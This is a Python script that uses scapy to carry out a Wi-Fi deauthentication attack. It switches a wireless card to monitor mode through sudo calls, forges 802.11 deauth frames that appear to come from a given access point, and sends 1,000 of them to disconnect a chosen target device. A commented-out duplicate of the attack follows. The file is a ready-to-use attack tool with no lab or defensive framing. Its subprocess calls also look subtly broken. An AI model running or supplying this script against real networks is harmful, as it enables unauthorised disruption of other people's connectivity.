from itertools import count
from tabnanny import verbose
import scapy.all as scapy
from subprocess import call
import optparse

parser = optparse.OptionParser()
parser.add_option('-t', '--target', dest = 'target_mac', help = 'MAC address of the target computer')
parser.add_option('-r', '--router', dest = 'router_mac', help = 'MAC address of the access point')
parser.add_option('-i', '--iface', dest = 'iface', help = 'Interface of the wireless card')

(options, _) = parser.parse_args()

required = ["target_mac", "router_mac", 'iface']
for r in required:
    if options.__dict__[r] is None:
        parser.error("parameter %s required"%r)


## setting to monitor mode
call(f'sudo ifconfig {options.iface} down')
call(f'sudo iwconfig {options.iface} mode monitor')
call(f'sudo ifconfig {options.iface} up')


## crafting the packet
dot_layer = scapy.Dot11(addr1 = options.target_mac, addr2 = options.router_mac, addr3 = options.router_mac)
packet = scapy.RadioTap() / dot_layer / scapy.Dot11Deauth(reason=7)

## sending the packet
scapy.sendp(packet, inter = 0.1, count = 1000, iface = options.iface, verbose = 1)

# dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
# # stack them up
# packet = RadioTap()/dot11/Dot11Deauth(reason=7)
# # send the packet
# sendp(packet, inter=0.1, count=100, iface="wlan0mon", verbose=1)